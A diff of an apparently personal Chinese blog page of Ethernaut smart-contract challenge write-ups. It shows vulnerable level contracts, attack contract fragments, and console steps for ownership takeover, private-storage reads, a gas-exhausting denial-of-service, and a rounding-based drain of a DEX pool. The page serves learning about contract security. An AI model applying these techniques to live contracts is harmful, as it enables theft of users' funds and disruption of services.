@@ -10,14 +10,12 @@
           document.documentElement.setAttribute("data-theme", "light");
         }
       })();
-    </script><link rel="stylesheet" href="/_astro/_folder_.C3c4OKj7.css"></head> <body class> <div class="page-shell"> <header class="topbar"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <button id="theme-toggle" type="button" aria-label="切换主题"> <span class="theme-icon theme-sun">☀</span> <span class="theme-icon theme-moon">☾</span> </button> </nav> </header> </div> <main id="main-content" class="page-shell page-main">  <article class="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">合约审计</span>  </div> <p class="eyebrow">2026/4/15</p> <h1>以太航员挑战</h1> <p class="lead"># 控制台用法 await contract：显示当前关卡所有可用方法 看slot内容 ```solidity await web3.eth.getStorageAt(&quot;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&quot;, 0) ``` DEX</p>  <div class="tag-row" style="justify-content: center; margin-bottom: 24px;">  </div> <p class="source-note">来源路径：web3/合约审计/以太航员挑战.md</p> </header> <div class="article-content"><h1>控制台用法</h1>
-<p>await contract：显示当前关卡所有可用方法</p>
+    </script><link rel="stylesheet" href="/_astro/_folder_.BG7-o3nY.css"></head> <body class> <div class="page-shell"> <header class="topbar"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <button id="theme-toggle" type="button" aria-label="切换主题"> <span class="theme-icon theme-sun">☀</span> <span class="theme-icon theme-moon">☾</span> </button> </nav> </header> </div> <main id="main-content" class="page-shell page-main">  <article class="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">合约审计</span>  </div> <p class="eyebrow">2026/4/15</p> <h1>以太航员挑战</h1> <p class="lead"># 控制台用法 await contract：显示当前关卡所有可用方法 看slot内容 ```solidity await web3.eth.getStorageAt(&quot;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&quot;, 0) ``` DEX</p>  <div class="tag-row" style="justify-content: center; margin-bottom: 24px;">  </div> <p class="source-note">来源路径：web3/合约审计/以太航员挑战.md</p> </header> <nav class="article-outline" aria-label="文章目录"> <div class="article-outline__head"> <strong>文章目录</strong> </div> <ol class="article-outline__list"> <li class="article-outline__item depth-2"> <a href="#section-1">思路</a> </li><li class="article-outline__item depth-2"> <a href="#section-2">什么是回调机制？</a> </li><li class="article-outline__item depth-2"> <a href="#section-3">Solidity 中的回调函数有两种</a> </li><li class="article-outline__item depth-2"> <a href="#section-4">① receive()</a> </li><li class="article-outline__item depth-2"> <a href="#section-5">② fallback(bytes calldata)</a> </li><li class="article-outline__item depth-2"> <a href="#section-6">exp</a> </li><li class="article-outline__item depth-3"> <a href="#section-7">错误的思路</a> </li><li class="article-outline__item depth-3"> <a href="#section-8">✅ 为什么在 Denial 必须保留 receive？</a> </li><li class="article-outline__item depth-3"> <a href="#section-9">✔️ 要想卡死 withdraw，必须让 partner.call 成功进入“回调”，然后在回调里卡死。</a> </li><li class="article-outline__item depth-3"> <a href="#section-10">✅ 那为什么你的 receive 里用 assert(false) 是 OK 的？</a> </li><li class="article-outline__item depth-2"> <a href="#section-11">攻击思路（简述）</a> </li><li class="article-outline__item depth-2"> <a href="#section-12">✅ 第一步</a> </li><li class="article-outline__item depth-2"> <a href="#section-13">✅ 第二步</a> </li><li class="article-outline__item depth-2"> <a href="#section-14">✅ 第三步</a> </li><li class="article-outline__item depth-2"> <a href="#section-15">✅ 第四步</a> </li><li class="article-outline__item depth-2"> <a href="#section-16">⚠️ 注意：池子此时开始失衡</a> </li><li class="article-outline__item depth-2"> <a href="#section-17">✅ 第五步</a> </li><li class="article-outline__item depth-2"> <a href="#section-18">🎉 最终一击（耗尽 token1 或 token2）</a> </li> </ol> </nav> <div class="article-content"><h1>控制台用法</h1><p>await contract：显示当前关卡所有可用方法</p>
 <p>看slot内容</p>
 <pre><code class="language-solidity">await web3.eth.getStorageAt(&quot;0x3b5520d524eEB80ad38BdC961cDFfAB7fa62bBcE&quot;, 0)
 </code></pre>
 <p>DEX关卡较多使用控制台，可参考</p>
-<h1>fallback</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>fallback</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract Fallback {
@@ -64,8 +62,7 @@ contract Fallback {
 <li><code>withdraw()</code>：只有 <code>owner</code> 可调用，把合约所有余额发给 <code>owner</code>（使用 <code>.transfer</code>）。</li>
 <li><code>receive()</code>：合约接收到直接转账（无 calldata）时执行；要求 <code>msg.value &gt; 0</code> 且 <code>contributions[msg.sender] &gt; 0</code>，然后把 <code>owner = msg.sender</code>。</li>
 </ul>
-<h2>思路</h2>
-<pre><code class="language-solidity">contract.contribute({value: 1}) //首先使贡献值大于0
+<h2 id="section-1">思路</h2><pre><code class="language-solidity">contract.contribute({value: 1}) //首先使贡献值大于0
 contract.sendTransaction({value: 1}) //触发receive函数
 contract.withdraw() //将合约的balance清零
 </code></pre>
@@ -90,8 +87,7 @@ contract.withdraw() //将合约的balance清零
 <pre><code class="language-solidity">signer.sendTransaction({to: contract.address, value: 1})
 </code></pre>
 <p>没有任何 calldata（data 字段为空），于是触发了 <code>receive()</code>。</p>
-<h1>fallout</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>fallout</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
 import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;
@@ -141,8 +137,7 @@ contract Fallout {
     }
 </code></pre>
 <p>构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。</p>
-<h1>CoinFlip</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>CoinFlip</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract CoinFlip {
@@ -203,8 +198,7 @@ contract Hack {
     }
 }
 </code></pre>
-<h1>Telephone</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>Telephone</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract Telephone {
@@ -250,8 +244,7 @@ contract exp{
 
 }
 </code></pre>
-<h1>Token 整数溢出</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>Token 整数溢出</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
 contract Token {
@@ -298,8 +291,7 @@ contract exp{
     }
 }
 </code></pre>
-<h1>Delegation 代理机制</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>Delegation 代理机制</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract Delegate {
@@ -344,8 +336,7 @@ contract Delegation {
 <li><code>web3.utils.sha3(&quot;pwn()&quot;)</code>：计算字符串 <code>&quot;pwn()&quot;</code> 的 Keccak-256 哈希（返回 <code>0x</code> 开头的 hex 字符串）。</li>
 <li><code>.slice(0,10)</code>：取哈希的前 10 个字符，也就是 <code>&quot;0x&quot; + 前 8 个 hex 字符</code>，即函数 selector（4 字节）。例如得到 <code>0xdd365b8b</code>。</li>
 </ul>
-<h1>Force 自毁机制强制给钱</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>Force 自毁机制强制给钱</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract Force { /*
@@ -369,8 +360,7 @@ contract attack{
     }
 }
 </code></pre>
-<h1>vault</h1>
-<p>打开金库以通过关卡！</p>
+<h1>vault</h1><p>打开金库以通过关卡！</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -396,8 +386,7 @@ contract Vault {
 await web3.eth.getStorageAt(&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;, 0)
 await web3.eth.getStorageAt(&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;, 1)
 </code></pre>
-<h1>king 回滚机制永久占据位置</h1>
-<p>合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。</p>
+<h1>king 回滚机制永久占据位置</h1><p>合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -441,8 +430,7 @@ contract attack{
 在右侧 Run 面板上方 Value 输入框填 0.0011（或 wei 值 1100000000000000），单位选 ether（或选 wei 并填 wei）。
 下方从已部署合约实例中选中 attack（确保是你刚部署那个地址）。。
 </code></pre>
-<h1>Re-entrance 重入攻击（回调）</h1>
-<p>此关卡的目标是让你从合约中窃取所有资金。</p>
+<h1>Re-entrance 重入攻击（回调）</h1><p>此关卡的目标是让你从合约中窃取所有资金。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
@@ -535,8 +523,7 @@ contract Attacker {
     }
 }
 </code></pre>
-<h1>**Elevator  不可信外部调用  **</h1>
-<p>这个电梯似乎并不会让你到达顶层</p>
+<h1>**Elevator  不可信外部调用  **</h1><p>这个电梯似乎并不会让你到达顶层</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -588,8 +575,7 @@ contract AttackElevator {
     }
 }
 </code></pre>
-<h1>Privacy</h1>
-<p>这份合约的创建者足够谨慎，保护了其存储中的敏感区域。解锁此合约即可通关。</p>
+<h1>Privacy</h1><p>这份合约的创建者足够谨慎，保护了其存储中的敏感区域。解锁此合约即可通关。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -628,8 +614,7 @@ contract Privacy {
     uint16 private awkwardness = uint16(block.timestamp);//合并成slot3
     bytes32[3] private data;
 </code></pre>
-<h1>gatekeeper one</h1>
-<p>通过门卫并注册为参赛者即可通过此关卡。</p>
+<h1>gatekeeper one</h1><p>通过门卫并注册为参赛者即可通过此关卡。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -690,8 +675,7 @@ contract GatekeeperOneAttack {
     }
 }
 </code></pre>
-<h1>gatekeeper two</h1>
-<p>注册成为参赛者以通过此关卡</p>
+<h1>gatekeeper two</h1><p>注册成为参赛者以通过此关卡</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -750,8 +734,7 @@ contract GatekeeperOneAttack {
     }
 }
 </code></pre>
-<h1>Naught Coin ERC20代币</h1>
-<p>NaughtCoin是一种ERC20代币，而你已经持有了所有的代币。问题在于，你只能在10年的锁定期结束后才能转移它们。你能想办法把代币转到另一个地址，以便自由转移吗？将你的代币余额降至0即可完成此关卡。</p>
+<h1>Naught Coin ERC20代币</h1><p>NaughtCoin是一种ERC20代币，而你已经持有了所有的代币。问题在于，你只能在10年的锁定期结束后才能转移它们。你能想办法把代币转到另一个地址，以便自由转移吗？将你的代币余额降至0即可完成此关卡。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -816,8 +799,7 @@ await contract.transferFrom(player, &quot;0xb5D90200E89F7e3AC01cA1A6A2E34987C55E
 //看余额
 (await contract.balanceOf(player) / 1e18).toString()
 </code></pre>
-<h1>preservation 代理攻击</h1>
-<p>本合同使用一个库来存储两个不同时区的两个不同时间。构造函数为每个要存储的时间创建该库的两个实例。</p>
+<h1>preservation 代理攻击</h1><p>本合同使用一个库来存储两个不同时区的两个不同时间。构造函数为每个要存储的时间创建该库的两个实例。</p>
 <p>目标拿下合同所有权</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -894,8 +876,7 @@ await contract.setFirstTime(&#39;1&#39;)//触发owner改变
 await contract.owner()
 &#39;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#39;
 </code></pre>
-<h1>recovery</h1>
-<p>一位合约创建者构建了一个非常简单的代币工厂合约。任何人都能轻松创建新代币。部署第一个代币合约后，创建者发送了0.001以太币以获取更多代币。此后，他们丢失了该合约地址。</p>
+<h1>recovery</h1><p>一位合约创建者构建了一个非常简单的代币工厂合约。任何人都能轻松创建新代币。部署第一个代币合约后，创建者发送了0.001以太币以获取更多代币。此后，他们丢失了该合约地址。</p>
 <p>从丢失的合约地址中找回（或移除）<code>0.001</code>以太币，此关卡即告完成。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -950,8 +931,7 @@ interface ISimpleToken {
 }
 </code></pre>
 <p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/5a800fb50fdfead773e38ad2e0f9682f_MD5.png" alt=""></p>
-<h1><strong>MagicNumber 字节码shellcode</strong></h1>
-<p>要解决此关卡，你只需向Ethernaut提供一个<code>Solver</code>，这是一个能够以正确的32字节数字响应<code>whatIsTheMeaningOfLife()</code>的合约。</p>
+<h1><strong>MagicNumber 字节码shellcode</strong></h1><p>要解决此关卡，你只需向Ethernaut提供一个<code>Solver</code>，这是一个能够以正确的32字节数字响应<code>whatIsTheMeaningOfLife()</code>的合约。</p>
 <p>Easy right? Well... there&#39;s a catch.很简单，对吧？不过……这里有个陷阱。</p>
 <p>The solver&#39;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#39; really really itty-bitty tiny: 10 bytes at most.求解器的代码必须非常精简。真的非常非常精简。简直是小得离谱的那种精简：最多10字节。</p>
 <p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That&#39;s right: Raw EVM bytecode.提示：或许是时候暂时离开Solidity编译器的舒适区，手动构建这个了，哦？没错：就是原始的EVM字节码。</p>
@@ -1067,8 +1047,7 @@ await contract.setSolver(&quot;contract address&quot;);
 <td>回调函数：交易发出后打印结果（一般是 <strong>交易哈希 txHash</strong>）。 - <code>err</code><br/> 如果发送失败（比如 gas 不够），会在这里显示错误； - <code>res</code><br/> 通常是返回的交易哈希字符串。</td>
 </tr>
 </tbody></table>
-<h1><strong>Alien Codex  动态数组在storage存放位置</strong></h1>
-<p>认领所有权</p>
+<h1><strong>Alien Codex  动态数组在storage存放位置</strong></h1><p>认领所有权</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.5.0;
 
@@ -1173,8 +1152,7 @@ let targetIdx = maxUint - arrayBase + 1n;
 //await contract.owner()
 //&#39;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#39;
 </code></pre>
-<h1>denial call的回调机制+dos</h1>
-<p>这是一个简单的钱包，资金会随着时间推移逐步存入。您可以通过成为提现partner来逐步提取资金。</p>
+<h1>denial call的回调机制+dos</h1><p>这是一个简单的钱包，资金会随着时间推移逐步存入。您可以通过成为提现partner来逐步提取资金。</p>
 <p>如果当所有者调用时，你能阻止他们提取资金<code>withdraw()</code> （当合约中还有资金，且交易金额为 100 万 gas 或更少时），你就能赢得这一关。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -1210,13 +1188,10 @@ contract Denial {
     }
 }
 </code></pre>
-<h2>什么是回调机制？</h2>
-<p>Solidity 中的“回调机制”指的是：</p>
+<h2 id="section-2">什么是回调机制？</h2><p>Solidity 中的“回调机制”指的是：</p>
 <p>当一个合约被 <strong>发送 ETH 或被 call 但没有匹配函数</strong> 时，EVM 会<strong>自动跳到某个特殊函数执行</strong> —— 这个函数就叫回调函数（fallback/receive）。</p>
 <p>它是<strong>被动触发</strong>的，不是显式调用的。</p>
-<h2>Solidity 中的回调函数有两种</h2>
-<h2>① <code>receive()</code></h2>
-<p>在下面场景触发：</p>
+<h2 id="section-3">Solidity 中的回调函数有两种</h2><h2 id="section-4">① <code>receive()</code></h2><p>在下面场景触发：</p>
 <ul>
 <li>外部 <strong>只是发送 ETH</strong>（不带 data）</li>
 <li>使用 <code>send</code>, <code>transfer</code>, 或 <code>call{value: X}(&quot;&quot;)</code></li>
@@ -1227,8 +1202,7 @@ contract Denial {
 }
 </code></pre>
 <hr>
-<h2>② <code>fallback(bytes calldata)</code></h2>
-<p>在下面场景触发：</p>
+<h2 id="section-5">② <code>fallback(bytes calldata)</code></h2><p>在下面场景触发：</p>
 <ul>
 <li>调用一个不存在的函数</li>
 <li>调用有 data 但没有匹配 selector</li>
@@ -1239,9 +1213,7 @@ contract Denial {
     // 收到未知调用或带 data 的 ETH 时执行
 }
 </code></pre>
-<h2>exp</h2>
-<h3>错误的思路</h3>
-<p>想到利用回调机制构建recive\fallback恶意重入，进行不断取钱</p>
+<h2 id="section-6">exp</h2><h3 id="section-7">错误的思路</h3><p>想到利用回调机制构建recive\fallback恶意重入，进行不断取钱</p>
 <p>你之所以会觉得“重入=可以无限取钱”，是因为你拿 <strong>Reentrancy（重入）Bank 类漏洞</strong>的模式，套到了 <strong>Denial 关卡</strong>。<br>但 Denial 的 withdraw 完全不是 Bank 模式。</p>
 <p>下面我用你最熟的 pwn/时序模型解释。</p>
 <hr>
@@ -1263,8 +1235,7 @@ contract Denial {
 <hr>
 <p>🚫 为什么不能像 Bank 那样重入无限提款？</p>
 <p>我们用时序模拟一下重入：</p>
-<h4>初始，例如合约里有 100 ETH</h4>
-<ul>
+<h4>初始，例如合约里有 100 ETH</h4><ul>
 <li>第一次 withdraw：<br>amount = 100/100 = 1 ETH<br>balance → 99 ETH</li>
 <li>重入第二次 withdraw：<br>amount = 99/100 = 0.99 ETH（会向下取整，如 0）<br>balance → 98 ETH</li>
 <li>重入第三次：<br>amount = 98/100 = 0.98 ETH</li>
@@ -1280,8 +1251,7 @@ contract Denial {
 <p>余额除以 100 的小数部分取整 → 再扣掉它</p>
 <p>根本不会出现“循环 100 次提走所有钱”的情况。</p>
 <hr>
-<h4>📉 一个非常关键的点：</h4>
-<p><strong>因 Solidity 的整数除法向下取整，所以 amount 在余额小于 100 wei 时直接变成 0。</strong></p>
+<h4>📉 一个非常关键的点：</h4><p><strong>因 Solidity 的整数除法向下取整，所以 amount 在余额小于 100 wei 时直接变成 0。</strong></p>
 <p>那意味着：</p>
 <ul>
 <li>当余额 &lt; 100 wei 时，</li>
@@ -1290,8 +1260,7 @@ contract Denial {
 <li>你也无法继续消耗余额</li>
 </ul>
 <p>你最多能拿走“剩余余额的 1%”，没有利用价值。</p>
-<h3>✅ 为什么在 Denial 必须保留 receive？</h3>
-<p>Denial 合约的 withdraw() 逻辑（简化版）是：</p>
+<h3 id="section-8">✅ 为什么在 Denial 必须保留 receive？</h3><p>Denial 合约的 withdraw() 逻辑（简化版）是：</p>
 <pre><code class="language-plain">function withdraw() public {
     uint amount = address(this).balance / 100;
     withdrawPartner.call{value: amount}(&quot;&quot;);   // 关键点
@@ -1310,13 +1279,11 @@ contract Denial {
 <li>DoS 失败 ❌</li>
 </ul>
 <p>也就是说：</p>
-<h3>✔️ 要想卡死 withdraw，必须让 partner.call 成功进入“回调”，然后在回调里卡死。</h3>
-<p>如果你没有 receive/fallback，call 根本不会进入回调函数。</p>
+<h3 id="section-9">✔️ 要想卡死 withdraw，必须让 partner.call 成功进入“回调”，然后在回调里卡死。</h3><p>如果你没有 receive/fallback，call 根本不会进入回调函数。</p>
 <p>这就像 pwn 里：</p>
 <p>你想利用回调路径，但你把 hook 函数删了 → 控制流根本不会到你的代码里 → 没法劫持程序。</p>
 <hr>
-<h3>✅ 那为什么你的 receive 里用 assert(false) 是 OK 的？</h3>
-<p>因为：</p>
+<h3 id="section-10">✅ 那为什么你的 receive 里用 assert(false) 是 OK 的？</h3><p>因为：</p>
 <ul>
 <li>assert(false) 会触发 Panic(uint)</li>
 <li>Panic 会消耗 <strong>所有剩余 gas</strong></li>
@@ -1353,8 +1320,7 @@ contract Attacker {
     }
 }
 </code></pre>
-<h1>shop</h1>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+<h1>shop</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface IBuyer {
@@ -1407,8 +1373,7 @@ contract Hack {
     }
 }
 </code></pre>
-<h1>dex ERC20 evm无浮点数的利用向下取整</h1>
-<p>你将初始获得10个<code>token1</code>和10个<code>token2</code>。去中心化交易所（DEX）合约初始拥有每种代币各100个。如果你能设法从合约中耗尽2个代币中至少1个的全部数量，并让合约报告资产的“不良”价格，你就能在这一关卡取得成功。</p>
+<h1>dex ERC20 evm无浮点数的利用向下取整</h1><p>你将初始获得10个<code>token1</code>和10个<code>token2</code>。去中心化交易所（DEX）合约初始拥有每种代币各100个。如果你能设法从合约中耗尽2个代币中至少1个的全部数量，并让合约报告资产的“不良”价格，你就能在这一关卡取得成功。</p>
 <p>通常情况下，当你用ERC20代币进行兑换时，必须<code>approve</code>合约代表你花费你的代币。为了与游戏的语法保持一致，我们刚刚在合约本身中添加了<code>approve</code>方法。因此，你可以放心使用<code>contract.approve(contract.address, &lt;uint amount&gt;)</code>，而不必直接调用代币，它会自动按所需数量授权花费这两种代币。除此之外，你可以忽略<code>SwappableToken</code>合约。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -1514,16 +1479,14 @@ i {negative: 0, words: Array(2), length: 1, red: null}
 
 (amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))
 </code></pre>
-<h2>攻击思路（简述）</h2>
-<p>我们会交替 swap：</p>
+<h2 id="section-11">攻击思路（简述）</h2><p>我们会交替 swap：</p>
 <ul>
 <li>用 <strong>player 的全部 token1 换 token2</strong></li>
 <li>再用 <strong>player 的全部 token2 换 token1</strong></li>
 </ul>
 <p>反复两次，DEX 的两个池子都会越来越小。</p>
 <p>最终当某一边池子变到 1 时，我们只用少量输入就能换光另一边。</p>
-<h2>✅ 第一步</h2>
-<p>玩家使用全部 <strong>10 token1</strong> 换 token2：</p>
+<h2 id="section-12">✅ 第一步</h2><p>玩家使用全部 <strong>10 token1</strong> 换 token2：</p>
 <pre><code class="language-plain">先授权
 await contract.approve(contract.address,500)
 
@@ -1542,8 +1505,7 @@ PLAYER:
   token2 = 20
 </code></pre>
 <hr>
-<h2>✅ 第二步</h2>
-<p>玩家用全部 <strong>20 token2</strong> 换 token1：</p>
+<h2 id="section-13">✅ 第二步</h2><p>玩家用全部 <strong>20 token2</strong> 换 token1：</p>
 <pre><code class="language-plain">await contract.swap(token2addr, token1addr, 20)
 </code></pre>
 <p>计算：</p>
@@ -1559,8 +1521,7 @@ PLAYER:
   token2 = 0
 </code></pre>
 <hr>
-<h2>✅ 第三步</h2>
-<p>玩家用全部 <strong>24 token1</strong> 换 token2：</p>
+<h2 id="section-14">✅ 第三步</h2><p>玩家用全部 <strong>24 token1</strong> 换 token2：</p>
 <pre><code class="language-plain">await contract.swap(token1addr, token2addr, 24)
 </code></pre>
 <p>计算：</p>
@@ -1576,8 +1537,7 @@ PLAYER:
   token2 = 30
 </code></pre>
 <hr>
-<h2>✅ 第四步</h2>
-<p>玩家再用全部 <strong>30 token2</strong> 换 token1：</p>
+<h2 id="section-15">✅ 第四步</h2><p>玩家再用全部 <strong>30 token2</strong> 换 token1：</p>
 <pre><code class="language-plain">await contract.swap(token2addr, tokenaAddr, 30)
 </code></pre>
 <p>计算：</p>
@@ -1593,11 +1553,9 @@ PLAYER:
   token2 = 0
 </code></pre>
 <hr>
-<h2>⚠️ 注意：池子此时开始失衡</h2>
-<p>从这里开始，只需要两三步就能完全 drain。</p>
+<h2 id="section-16">⚠️ 注意：池子此时开始失衡</h2><p>从这里开始，只需要两三步就能完全 drain。</p>
 <hr>
-<h2>✅ 第五步</h2>
-<p>用全部 <strong>41 token1</strong> 换 token2：</p>
+<h2 id="section-17">✅ 第五步</h2><p>用全部 <strong>41 token1</strong> 换 token2：</p>
 <pre><code class="language-plain">await contract.swap(token1addr, token2addr, 41)
 </code></pre>
 <p>计算：</p>
@@ -1614,8 +1572,7 @@ PLAYER:
 </code></pre>
 <p>很好！此时 token2 剩 45，你有 65，可以继续压缩池子。</p>
 <hr>
-<h2>🎉 最终一击（耗尽 token1 或 token2）</h2>
-<p>你现在用大量 token2 来换 token1：</p>
+<h2 id="section-18">🎉 最终一击（耗尽 token1 或 token2）</h2><p>你现在用大量 token2 来换 token1：</p>
 <pre><code class="language-plain">await contract.swap(token2addr, token1addr, 45)
 </code></pre>
 <p>计算：</p>
@@ -1639,8 +1596,7 @@ T2 → T1 : 30
 T1 → T2 : 41
 T2 → T1 : 45   ← 这里就爆掉一边了
 </code></pre>
-<h1>dex two</h1>
-<p>这一关会要求你攻破<DexTwo>，这是上一关<Dex>合约经过细微修改后的版本，但需要用不同的方法。</p>
+<h1>dex two</h1><p>这一关会要求你攻破<DexTwo>，这是上一关<Dex>合约经过细微修改后的版本，但需要用不同的方法。</p>
 <p>你需要从DexTwo合约中提取出token1和token2的所有余额，才能成功通过此关卡。</p>
 <p>你仍将从10个<code>token1</code>代币和10个<code>token2</code>代币开始。去中心化交易所（DEX）合约仍将从每种代币各100个开始。</p>
 <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
@@ -1713,8 +1669,7 @@ await contract.token1()
 &#39;0xEB8Cc829102d8d06A772Aeb0cCd2230f6f5C7dfc&#39;
 
 </code></pre>
-<h1>puzzle wallet</h1>
-<p>Nowadays, paying for DeFi operations is impossible, fact.如今，为去中心化金融操作付费是不可能的，这是事实。</p>
+<h1>puzzle wallet</h1><p>Nowadays, paying for DeFi operations is impossible, fact.如今，为去中心化金融操作付费是不可能的，这是事实。</p>
 <p>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.一群朋友发现了通过将多笔交易合并为一笔来略微降低执行成本的方法，于是他们开发了一个用于实现这一功能的智能合约。</p>
 <p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.他们希望这份合约是可升级的，以防代码中存在漏洞，同时也想阻止群组外的人使用它。为此，他们进行了投票，并在系统中为两个人分配了特殊角色：管理员，拥有更新智能合约逻辑的权力；所有者，控制着被允许使用该合约的地址白名单。合约部署完成后，该群组被加入白名单。所有人都为他们在对抗恶意矿工方面取得的成就而欢呼。</p>
 <p>Little did they know, their lunch money was at risk…他们万万没想到，自己的午餐钱正处于危险之中……</p>
